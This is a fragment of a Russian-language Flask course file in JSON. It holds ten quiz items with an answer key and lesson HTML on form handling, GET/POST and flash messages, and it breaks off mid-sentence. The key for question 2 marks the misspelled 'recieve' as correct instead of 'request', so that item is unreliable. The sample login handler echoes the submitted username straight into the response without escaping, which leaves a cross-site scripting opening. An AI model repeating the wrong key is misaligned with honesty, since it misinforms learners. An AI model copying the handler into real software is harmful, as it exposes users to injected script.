                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "PUT",
                            "DELETE",
                            "GET",
                            "POST"
                        ],
                        "question": "Какой HTTP-метод обычно используется для отправки данных формы на сервер во Flask?",
                        "correct_index": 3
                    },
                    {
                        "id": 2,
                        "options": [
                            "recieve",
                            "response",
                            "get",
                            "request"
                        ],
                        "question": "Какой объект Flask используется для получения данных, отправленных из HTML-формы?",
                        "correct_index": 0
                    },
                    {
                        "id": 3,
                        "options": [
                            "request.post",
                            "request.data",
                            "request.form ",
                            "request.cookies"
                        ],
                        "question": "Где во Flask хранятся данные, отправленные из формы методом POST?",
                        "correct_index": 2
                    },
                    {
                        "id": 4,
                        "options": [
                            "Для подключения базы данных",
                            "Для работы flash-сообщений и сессий ",
                            "Для обработки GET-запросов",
                            "Для рендеринга шаблонов"
                        ],
                        "question": "Зачем в приложении Flask необходимо задавать SECRET_KEY?",
                        "correct_index": 1
                    },
                    {
                        "id": 5,
                        "options": [
                            "message()",
                            "notify()",
                            "alert()",
                            "flash() "
                        ],
                        "question": "Какая функция Flask используется для создания мгновенного сообщения пользователю?",
                        "correct_index": 3
                    },
                    {
                        "id": 6,
                        "options": [
                            "show_flash()",
                            "flash_messages() ",
                            "get_flashed_messages() ",
                            "render_flash()"
                        ],
                        "question": "Какая функция используется в шаблоне для вывода flash-сообщений?",
                        "correct_index": 2
                    },
                    {
                        "id": 7,
                        "options": [
                            "Сообщение не будет отображаться",
                            "Flask автоматически сгенерирует ключ",
                            "Сообщение отобразится несколько раз",
                            "Возникнет ошибка RuntimeError "
                        ],
                        "question": "Что произойдёт, если использовать flash(), но не задать SECRET_KEY?",
                        "correct_index": 3
                    },
                    {
                        "id": 8,
                        "options": [
                            "name",
                            "id",
                            "class",
                            "value"
                        ],
                        "question": "Какой атрибут HTML-элемента <input> используется для передачи данных в request.form?",
                        "correct_index": 0
                    },
                    {
                        "id": 9,
                        "options": [
                            "Для задания HTTP-метода",
                            "Для сортировки сообщений по категории",
                            "Для стилизации и группировки сообщений ",
                            "Для хранения сообщений в базе данных"
                        ],
                        "question": "Для чего используется параметр category в функции flash()?",
                        "correct_index": 2
                    },
                    {
                        "id": 10,
                        "options": [
                            "True ",
                            "with_categories=True ",
                            "categories=True",
                            "use_categories=True"
                        ],
                        "question": "Какой параметр нужно передать в get_flashed_messages(), чтобы получить категории сообщений?",
                        "correct_index": 1
                    }
                ],
                "theory_html": "<h4>1. Пример обработки формы.</h4><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Рассмотрим простейший пример обработки формы авторизации. Базы данных для хранения учетных записей у нас пока нет, поэтому в приведенном ниже коде мы пропустим всю функциональность для проверки корректности логина и пароля.</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">1. В каталоге </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">templates</span><span style=\"mso-themecolor:text1;\"> создайте страницу </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">login</span><span style=\"mso-themecolor:text1;\">.</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"mso-themecolor:text1;\"> в которой будет </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"mso-themecolor:text1;\">-код формы.<o:p></o:p></span></span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span>\r\n{% block content %}<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n&lt;h1&gt;Вход на сайт&lt;/h1&gt;<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n&lt;div&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&lt;form action=\"{{ url_for('login') }}\" method=\"post\"&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;label for=\"username\"&gt;Логин:&lt;/label&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;input type=\"text\" id=\"username\" name=\"username\" required&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;p&gt;&lt;/p&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;label for=\"password\"&gt;Пароль:&lt;/label&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;input type=\"password\" id=\"password\" name=\"password\" required&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;p&gt;&lt;/p&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;button type=\"submit\"&gt;Войти&lt;/button&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&lt;/form&gt;<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n&lt;/div&gt;<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n{% endblock %}<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></code></pre><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Пояснения к коду:<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">В форме, в атрибуте </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">action</span><span style=\"mso-themecolor:text1;\">, указываем обработчик введённых данных, который, обычно, совпадает с обработчиком соответствующего маршрута.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Также указываем </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">http</span><span style=\"mso-themecolor:text1;\">-метод передачи данных из формы (из браузера) в обработчик (на сервер) (о </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">http</span><span style=\"mso-themecolor:text1;\">-методах позже). Далее описываем необходимые поля формы (</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">input</span><span style=\"mso-themecolor:text1;\">-ы) соответствующих типов, и необходимые подписи (</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">label</span><span style=\"mso-themecolor:text1;\">-ы). Для полей указываем атрибуты </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">name</span><span style=\"mso-themecolor:text1;\"> по которым мы будем получать данные в обработчике. (для будущей </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">css</span><span style=\"mso-themecolor:text1;\">-стилизации элементов необходимо также указывать атрибут </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">class</span><span style=\"mso-themecolor:text1;\">). В конце пишем кнопку отправки, обязательно с </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">type</span><span style=\"mso-themecolor:text1;\">-ом '</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">submit</span><span style=\"mso-themecolor:text1;\">'. Именно при нажатии кнопки происходит соответствующий </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">http</span><span style=\"mso-themecolor:text1;\">-запрос от клиента к серверу и данные формы уходят в обработчик.</span><span style=\"mso-spacerun:yes;mso-themecolor:text1;\">&nbsp;</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">2. Для обработки форм необходимо добавить компонент фреймворка </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">Flask</span><span style=\"mso-themecolor:text1;\"> по имени request (запрос).<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">В файле </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">app</span><span style=\"mso-themecolor:text1;\">.</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">py</span><span style=\"mso-themecolor:text1;\">, в первой строке импортов, добавьте импорт request:<o:p></o:p></span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;mso-themecolor:text1;\" lang=\"EN-US\">from flask import Flask, render_template, request</span></code></span></p><p class=\"a\">&nbsp;</p><p class=\"a\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">3. Создайте маршрут на страницу с формой login.html :<o:p></o:p></span></span></p><pre><code class=\"language-jinja2\">@app.route('/login/', methods=['GET', 'POST'])<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\ndef login():<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;if request.method == 'POST':<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;username = request.form.get('username')<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;password = request.form.get('password')<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;# здесь должна быть проверка логина и пароля<span style=\"color:black;\"><span style=\"line-height:115%;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;return username + ' - Вы вошли в систему!'<span style=\"color:black;\"><span style=\"line-height:115%;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n &nbsp;else:<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;return render_template('login.html', title=\"Авторизация\")<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></code></pre><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Пояснения к коду:<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Маршрут<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;font-family:&quot;Courier New&quot;;\"><code><span style=\"mso-themecolor:text1;\">@</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">app</span><span style=\"mso-themecolor:text1;\">.</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">route</span><span style=\"mso-themecolor:text1;\">('/</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">login</span><span style=\"mso-themecolor:text1;\">/', </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">methods</span><span style=\"mso-themecolor:text1;\">=['</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">GET</span><span style=\"mso-themecolor:text1;\">', '</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">POST</span><span style=\"mso-themecolor:text1;\">'])</span></code></span><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">обрабатывает и POST, и GET-запросы: в первом случае он отправит данные на сервер, во втором – просто выведет страницу с формой авторизации. В обработчике мы просто делаем request-ы (запросы) к форме, точнее к её полям с именами '</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">username</span><span style=\"mso-themecolor:text1;\">' и '</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">password</span><span style=\"mso-themecolor:text1;\">', получаем соответствующие данные и присваиваем их в переменные. Ну и далее мы что то делаем с этими данными (как то их обрабатываем, записываем в базу данных, куда то передаём и т.д.). В нашем простейшем случае, мы просто выводим содержимое поля 'username' на страницу.</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">4. В базовом шаблоне </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">base</span><span style=\"mso-themecolor:text1;\">.</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"mso-themecolor:text1;\">, в разделе меню добавьте маршрут на страницу </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">login</span><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\">&lt;li&gt;&lt;a href=\"{{ url_for('login') }}\"&gt;</span><span style=\"line-height:115%;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\">Логин</span><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\">&lt;/a&gt;&lt;/li&gt;</span></code></span></p><p class=\"a\">&nbsp;</p><p class=\"a\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">5. Запустите приложение, откройте страницу </span><span style=\"line-height:115%;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\">Логин</span><span style=\"mso-themecolor:text1;\">.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Введите произвольные данные и нажмите \"войти\".<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Понятно, что без базы данных хранящей логины и пароли это бессмысленно, но страница с формой и обработчик формы в приложении работают.</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><strong>GET и POST-запросы</strong><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">GET и POST – это HTTP-запросы, которые используются для отправки данных между клиентом и сервером.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">GET-запрос применяют для получения данных от сервера. При выполнении GET-запроса клиент отправляет запрос на сервер, а сервер возвращает запрошенную информацию в ответ. GET-запросы могут содержать параметры в URL-адресе, которые используются для передачи дополнительных данных. Например:<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><code><span style=\"mso-themecolor:text1;\">/handler?name=Alex&amp;old=18&amp;profit=1000</span></code><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">POST-запрос используют для отправки данных на сервер. При выполнении POST-запроса клиент отправляет данные на сервер, а сервер их обрабатывает. POST-запросы обычно применяют для отправки форм, с данными из которых нужно что-то сделать на бэкенде.</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><h4>2. Другой пример формы.</h4><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">1. Создайте страницу contact</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">s</span><span style=\"mso-themecolor:text1;\">.html (или измените, если она есть).<o:p></o:p></span></span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span>\r\n{% block content %}<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n&lt;h1&gt;Страница Контакты&lt;/h1&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n&lt;form action=\"{{ url_for('contacts') }}\" method=\"post\"&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&lt;p&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;label&gt;Имя:<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=\"text\" name=\"username\" value=\"\" required&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;/label&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&lt;/p&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&lt;p&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;label&gt;Email:  <span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=\"text\" name=\"email\" value=\"\" required&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;/label&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&lt;/p&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;label&gt;Сообщение: &lt;br&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;textarea name=\"message\" rows=7 cols=40&gt;  &lt;/textarea&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;/label&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&lt;p&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&lt;input type=\"submit\" value=\"Отправить\"&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&lt;/p&gt;<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n&lt;/form&gt;<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n{% endblock %}<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></code></pre><p class=\"a\" style=\"line-height:normal;\"><span style=\"color:black;font-size:13.0pt;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">2. Добавьте маршрут на страницу в </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">base</span><span style=\"mso-themecolor:text1;\">.</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"mso-spacerun:yes;mso-themecolor:text1;\">&nbsp; </span><span style=\"mso-themecolor:text1;\">(если не было)<o:p></o:p></span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\">&lt;li&gt;&lt;a href=\"{{ url_for('contacts') }}\"&gt;</span><span style=\"line-height:115%;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\">Контакты</span><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\">&lt;/a&gt;&lt;/li&gt;</span></code></span></p><p class=\"a\">&nbsp;</p><p class=\"a\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">3. Создайте функцию рендеринга страницы 'Контакты'</span><span style=\"mso-spacerun:yes;mso-themecolor:text1;\">&nbsp; </span><span style=\"mso-themecolor:text1;\">(если не было)<o:p></o:p></span></span></p><pre><code class=\"language-jinja2\">@app.route(\"/contacts/\")<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\ndef contacts():<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;return render_template(\"contacts.html\", title=\"Контакты\")</code></pre><p class=\"a\">&nbsp;</p><p class=\"a\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-fareast-language:RU;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">4. Запустите приложение, перейдите на страницу 'Контакты'.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Пока форма не работает, т.к. мы не описали обработчик данных формы, но прежде, познакомимся с новой подтемой в обработке форм.</span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><h4>Мгновенные<span style=\"mso-ansi-language:EN-US;\"> </span>сообщения<span style=\"mso-ansi-language:EN-US;\" lang=\"EN-US\">: flash, get_flashed_messages<o:p></o:p></span></h4><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">В современном Web-программировании считается хорошим стилем отправлять пользователю мгновенные сообщения о результатах взаимодействия с сайтом. Например, при отправке данных формы, пользователю можно написать, что данные отправлены успешно, или, наоборот, что произошла ошибка. Этот функционал встроен во фреймворк Flask и реализуется с помощью двух функций:<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">flash() – формирование сообщения пользователю;<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">get_flashed_messages() – обработка сформированных сообщений в шаблоне документа.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Их</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">синтаксис</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">, </span><span style=\"mso-themecolor:text1;\">следующий</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">:<o:p></o:p></span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">flask.flash(message, category=’message’)</span></code><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">flask.get_flashed_messages(with_categories=False, category_filter=[])</span></code><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">message – текст сообщения;<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">category – категория 